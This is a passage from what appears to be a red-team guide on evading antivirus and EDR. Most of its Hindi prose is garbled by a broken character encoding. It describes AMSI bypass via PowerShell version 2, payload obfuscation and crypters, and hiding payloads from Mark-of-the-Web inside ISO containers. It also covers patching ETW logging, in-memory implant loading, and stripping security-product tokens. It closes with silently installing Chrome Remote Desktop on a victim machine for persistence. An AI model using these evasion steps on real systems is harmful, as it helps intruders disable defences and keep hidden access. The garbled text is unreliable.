- **Powershell version 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**: рдпрджрд┐ рдЖрдк PowerShell version 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AMSI рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреА рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдмрд┐рдирд╛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `powershell.exe -version 2`
- **Unmanaged Powershell Session рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ defenses рдХреЗ рдмрд┐рдирд╛ рдПрдХ powershell spawn рдХрд░реЗрдВ (рдпрд╣ рд╡рд╣реА рд╣реИ рдЬреЛ `powerpick` from Cobal Strike рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ)ред

## Obfuscation

> [!TIP]
> рдХрдИ obfuscation techniques рдбреЗрдЯрд╛ рдХреЛ encrypt рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдмрд╛рдЗрдирд░реА рдХреА entropy рдмрдврд╝ рдЬрд╛рдПрдЧреА рдФрд░ AVs рддрдерд╛ EDRs рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ detect рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ рдФрд░ рд╕рдВрднрд╡ рд╣реЛ рддреЛ encryption рдХреЗрд╡рд▓ рдЙрди specific рд╕реЗрдХреНрд╢рдиреНрд╕ рдкрд░ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВ рдпрд╛ рдЬрд┐рдиреНрд╣реЗрдВ рдЫреБрдкрд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

### Deobfuscating ConfuserEx-Protected .NET Binaries

рдЬрдм рдЖрдк ConfuserEx 2 (рдпрд╛ commercial forks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ malware рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЕрдХреНрд╕рд░ рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рддреЗрдВ рдорд┐рд▓рддреА рд╣реИрдВ рдЬреЛ decompilers рдФрд░ sandboxes рдХреЛ рдмреНрд▓реЙрдХ рдХрд░ рджреЗрддреА рд╣реИрдВред рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ workflow рднрд░реЛрд╕реЗрдордВрдж рддрд░реАрдХреЗ рд╕реЗ рдПрдХ nearтАУoriginal IL рдХреЛ **restore** рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ dnSpy рдпрд╛ ILSpy рдЬреИрд╕реЗ рдЯреВрд▓реНрд╕ рдореЗрдВ C# рдореЗрдВ decompile рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

1.  Anti-tampering removal тАУ ConfuserEx рд╣рд░ *method body* рдХреЛ encrypt рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ *module* static constructor (`<Module>.cctor`) рдХреЗ рдЕрдВрджрд░ decrypt рдХрд░рддрд╛ рд╣реИред рдпрд╣ PE checksum рдХреЛ рднреА patch рдХрд░ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХреЛрдИ рднреА modification binary рдХреЛ crash рдХрд░ рджреЗрдЧрд╛ред рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб metadata tables рдХреЛ locate рдХрд░рдиреЗ, XOR keys recover рдХрд░рдиреЗ рдФрд░ рдПрдХ clean assembly rewrite рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **AntiTamperKiller** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output рдореЗрдВ 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) рд╣реЛрдВрдЧреЗ рдЬреЛ рдЕрдкрдирд╛ unpacker рдмрдирд╛рдиреЗ рдкрд░ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

2.  Symbol / control-flow recovery тАУ *clean* рдлрд╛рдЗрд▓ рдХреЛ **de4dot-cex** (de4dot рдХрд╛ ConfuserEx-aware fork) рдХреЛ рдлрд╝реАрдб рдХрд░реЗрдВ:
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
тАв `-p crx` тАУ ConfuserEx 2 profile рдЪреБрдиреЗрдВ  
тАв de4dot control-flow flattening рдХреЛ undo рдХрд░реЗрдЧрд╛, original namespaces, classes рдФрд░ variable names restore рдХрд░реЗрдЧрд╛ рдФрд░ constant strings рдХреЛ decrypt рдХрд░реЗрдЧрд╛ред

3.  Proxy-call stripping тАУ ConfuserEx direct method calls рдХреЛ lightweight wrappers (a.k.a *proxy calls*) рд╕реЗ replace рдХрд░ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ decompilation рдФрд░ рдЯреВрдЯреЗред рдЗрдиреНрд╣реЗрдВ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **ProxyCall-Remover** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
рдЗрд╕ рдЪрд░рдг рдХреЗ рдмрд╛рдж рдЖрдкрдХреЛ opaque wrapper functions (`Class8.smethod_10`, тАж) рдХреА рдмрдЬрд╛рдп normal .NET API рдЬреИрд╕реЗ `Convert.FromBase64String` рдпрд╛ `AES.Create()` рджрд┐рдЦрдиреА рдЪрд╛рд╣рд┐рдПред

4.  Manual clean-up тАУ resulting binary рдХреЛ dnSpy рдореЗрдВ рдЪрд▓рд╛рдПрдБ, рдмрдбрд╝реЗ Base64 blobs рдпрд╛ `RijndaelManaged`/`TripleDESCryptoServiceProvider` рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП search рдХрд░реЗрдВ рддрд╛рдХрд┐ *real* payload рдХрд╛ рдкрддрд╛ рд▓рдЧ рд╕рдХреЗред рдЕрдХреНрд╕рд░ malware рдЗрд╕реЗ TLV-encoded byte array рдХреЗ рд░реВрдк рдореЗрдВ `<Module>.byte_0` рдХреЗ рдЕрдВрджрд░ initialise рдХрд░рдХреЗ store рдХрд░рддрд╛ рд╣реИред

рдКрдкрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ chain execution flow рдХреЛ рдЙрд╕ malicious sample рдХреЛ рдЪрд▓рд╛рдП рдмрд┐рдирд╛ **restore** рдХрд░ рджреЗрддрд╛ рд╣реИ тАУ рдпрд╣ offline workstation рдкрд░ рдХрд╛рдо рдХрд░рддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧреА рд╣реИред

> ЁЯЫИ  ConfuserEx рдПрдХ custom attribute `ConfusedByAttribute` рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ IOC рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ samples рдХреЛ automatic рддрд░реАрдХреЗ рд╕реЗ triage рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп LLVM compilation suite рдХрд╛ рдПрдХ open-source fork рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ рдЬреЛ code obfuscation рдФрд░ tamper-proofing рдХреЗ рдЬрд╝рд░рд┐рдП рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛ рд╕рдХреЗред
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator рдпрд╣ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ `C++11/14` рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, compile time рдкрд░, рдХрд┐рд╕реА рднреА external tool рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдФрд░ compiler рдХреЛ modify рдХрд┐рдП рдмрд┐рдирд╛ obfuscated code рдХреИрд╕реЗ generate рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework рджреНрд╡рд╛рд░рд╛ generate рдХрд┐рдП рдЧрдП obfuscated operations рдХреА рдПрдХ рдкрд░рдд рдЬреЛрдбрд╝рддрд╛ рд╣реИ, рдЬреЛ application рдХреЛ crack рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХреЛ рдереЛрдбрд╝рд╛ рдХрдард┐рди рдмрдирд╛ рджреЗрдЧрд╛ред
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz рдПрдХ x64 binary obfuscator рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА pe files рдЬреИрд╕реЗ: .exe, .dll, .sys рдХреЛ obfuscate рдХрд░ рд╕рдХрддрд╛ рд╣реИред
- [**metame**](https://github.com/a0rtega/metame): Metame рдПрдХ рд╕рд╛рдзрд╛рд░рдг metamorphic code engine рд╣реИ arbitrary executables рдХреЗ рд▓рд┐рдПред
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator рдПрдХ fine-grained code obfuscation framework рд╣реИ рдЬреЛ LLVM-supported рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП ROP (return-oriented programming) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред ROPfuscator рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ assembly code рд╕реНрддрд░ рдкрд░ obfuscate рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдп рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЛ ROP chains рдореЗрдВ рдмрджрд▓рдХрд░ normal control flow рдХреА рд╣рдорд╛рд░реА рд╕рд╛рдорд╛рдиреНрдп рдзрд╛рд░рдгрд╛ рдХреЛ рд╡рд┐рдлрд▓ рдХрд░ рджреЗрддрд╛ рд╣реИред
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдПрдХ .NET PE Crypter рд╣реИ
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor рдореМрдЬреВрджрд╛ EXE/DLL рдХреЛ shellcode рдореЗрдВ convert рдХрд░рдХреЗ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ load рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИред

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП Zone.Identifier ADS рдХреА рдЬрд╛рдБрдЪред</p></figcaption></figure>

> [!TIP]
> рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдРрд╕реЗ executables рдЬреЛ рдХрд┐рд╕реА trusted signing certificate рдХреЗ рд╕рд╛рде signed рд╣реЛрддреЗ рд╣реИрдВ, рд╡рд╣ SmartScreen рдХреЛ trigger рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗред

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows рдореЗрдВ рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА logging mechanism рд╣реИ рдЬреЛ applications рдФрд░ system components рдХреЛ **log events** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ security products рджреНрд╡рд╛рд░рд╛ malicious activities рдХреЛ monitor рдФрд░ detect рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЬрд┐рд╕ рддрд░рд╣ AMSI рдХреЛ disable (bypass) рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрд╕реА рддрд░рд╣ user space рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **`EtwEventWrite`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рддреБрд░рдВрдд return рдХрд░рд╡рд╛ рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ рдХреЛрдИ рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рди рд╣реЛред рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЛ memory рдореЗрдВ patch рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рддреБрд░рдВрдд return рдХрд░ рджреЗ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП ETW logging рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ disabled рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ memory рдореЗрдВ рд▓реЛрдб рдХрд░рдирд╛ рдХрд╛рдлреА рд╕рдордп рд╕реЗ рдЬрд╛рдирд╛-рдкрд╣рдЪрд╛рдирд╛ рддрд░реАрдХрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЕрднреА рднреА рдЖрдкрдХреЗ post-exploitation tools рдХреЛ AV рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдмрд┐рдирд╛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдПрдХ рд╢рд╛рдирджрд╛рд░ рддрд░реАрдХрд╛ рд╣реИред

рдЪреВрдБрдХрд┐ payload рд╕реАрдзреЗ memory рдореЗрдВ рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдФрд░ disk рдХреЛ рдЫреБрдПрдЧрд╛ рдирд╣реАрдВ, рд╣рдореЗрдВ рдкреВрд░реЗ process рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ AMSI рдХреЛ patch рдХрд░рдиреЗ рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреА рд╣реЛрдЧреАред

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, рдЖрджрд┐) рдкрд╣рд▓реЗ рд╕реЗ рд╣реА C# assemblies рдХреЛ рд╕реАрдзреЗ memory рдореЗрдВ execute рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╣реИрдВ:

- **Fork\&Run**

рдпрд╣ **рдПрдХ рдирдпрд╛ sacrificial process spawn** рдХрд░рдиреЗ, рдЙрд╕ рдирдП process рдореЗрдВ рдЖрдкрдХрд╛ post-exploitation malicious code inject рдХрд░рдиреЗ, рдЕрдкрдирд╛ malicious code execute рдХрд░рдиреЗ рдФрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рдирдП process рдХреЛ kill рдХрд░рдиреЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдлрд╛рдпрджреЗ рдФрд░ рдиреБрдХрд╕рд╛рди рджреЛрдиреЛрдВ рд╣реИрдВред Fork and run рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдпрд╣ рд╣реИ рдХрд┐ execution рд╣рдорд╛рд░реЗ Beacon implant process рдХреЗ **рдмрд╛рд╣рд░** рд╣реЛрддреА рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ рд╣рдорд╛рд░реА post-exploitation рдХрд╛рд░реНрд░рд╡рд╛рдИ рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЬрд╛рдП рдпрд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛рдП, рддреЛ рд╣рдорд╛рд░реЗ **implant рдХреЗ рдмрдЪрдиреЗ** рдХреА рд╕рдВрднрд╛рд╡рдирд╛ **рдХрд╛рдлреА рдЕрдзрд┐рдХ** рд╣реЛрддреА рд╣реИред рдиреБрдХрд╕рд╛рди рдпрд╣ рд╣реИ рдХрд┐ Behavioural Detections рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдЬрд╛рдиреЗ рдХреА рдЖрдкрдХреА **рд╕рдВрднрд╛рд╡рдирд╛ рдЕрдзрд┐рдХ** рд╣реЛрддреА рд╣реИред

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

рдпрд╣ рдЕрдкрдиреЗ рд╣реА process рдореЗрдВ post-exploitation malicious code **inject** рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИред рдЗрд╕ рддрд░рд╣ рдЖрдк рдПрдХ рдирдпрд╛ process рдмрдирд╛рдиреЗ рдФрд░ рдЙрд╕реЗ AV рджреНрд╡рд╛рд░рд╛ scan рдХрд░рд╡рд╛рдиреЗ рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдХрдореА рдпрд╣ рд╣реИ рдХрд┐ рдЕрдЧрд░ рдЖрдкрдХреЗ payload рдХреЗ execution рдХреЗ рд╕рд╛рде рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХрд╛ beacon crash рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ **рдмреЗрд╣рдж рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдирд╛ beacon **рдЦреЛ рджреЗрдВ**ред

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдЕрдЧрд░ рдЖрдк C# Assembly loading рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕ рд▓реЗрдЦ рдХреЛ рджреЗрдЦреЗрдВ [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) рдФрд░ рдЙрдирдХрд╛ InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

рдЖрдк C# Assemblies **from PowerShell** рд╕реЗ рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рджреЗрдЦреЗрдВ [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) рдФрд░ [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ malicious code execute рдХрд┐рдпрд╛ рдЬрд╛рдП рдЕрдЧрд░ compromised machine рдХреЛ **the interpreter environment installed on the Attacker Controlled SMB share** рддрдХ рдкрд╣реБрдБрдЪ рджреА рдЬрд╛рдПред

SMB share рдкрд░ Interpreter Binaries рдФрд░ environment рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рд╕реЗ рдЖрдк compromised рдорд╢реАрди рдХреА memory рдХреЗ рднреАрддрд░ рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ **execute arbitrary code in these languages within memory** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд░рд┐рдкреЛ рдмрддрд╛рддрд╛ рд╣реИ: Defender рдЕрднреА рднреА scripts рдХреЛ scan рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди Go, Java, PHP рдЖрджрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ **static signatures рдХреЛ bypass рдХрд░рдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд▓рдЪреАрд▓рд╛рдкрди** рд╣реИред рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ random un-obfuscated reverse shell scripts рдХреЗ рд╕рд╛рде рдкрд░реАрдХреНрд╖рдг рд╕рдлрд▓ рд░рд╣рд╛ рд╣реИред

## TokenStomping

Token stomping рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ attacker рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдХрд┐ рд╡рд╣ access token рдпрд╛ EDR рдпрд╛ AV рдЬреИрд╕реЗ рдХрд┐рд╕реА security product рдХреЛ **manipulate** рдХрд░реЗ, рдЬрд┐рд╕рд╕реЗ рд╡реЗ рдЙрд╕рдХреЗ privileges рдШрдЯрд╛ рд╕рдХреЗрдВ рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд░ рди рдЬрд╛рдП рдкрд░ рдЙрд╕рдХреЗ рдкрд╛рд╕ malicious activities рдЬрд╛рдВрдЪрдиреЗ рдХреА permissions рди рд░рд╣реЗрдВред

Windows рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП **external processes** рдХреЛ security processes рдХреЗ tokens рдкрд░ handles рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИред

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

рдЬреИрд╕рд╛ рдХрд┐ [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) рдореЗрдВ рд╡рд░реНрдгрд┐рдд рд╣реИ, рдпрд╣ рдЖрд╕рд╛рди рд╣реИ рдХрд┐ рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЗ PC рдореЗрдВ Chrome Remote Desktop рддреИрдирд╛рдд рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ takeover рдФрд░ persistence рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ:
1. https://remotedesktop.google.com/ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ, "Set up via SSH" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рдлрд┐рд░ Windows рдХреЗ рд▓рд┐рдП MSI рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП MSI рдлрд╝рд╛рдЗрд▓ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
2. рдкреАрдбрд╝рд┐рдд рдкрд░ рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдХреЛ silently рдЪрд▓рд╛рдПрдБ (admin рдЖрд╡рд╢реНрдпрдХ): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop рдкреЗрдЬ рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдБ рдФрд░ next рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рд╡рд┐рдЬрд╝рд╛рд░реНрдб рдЖрдкрдХреЛ authorize рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдЧрд╛; рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП Authorize рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
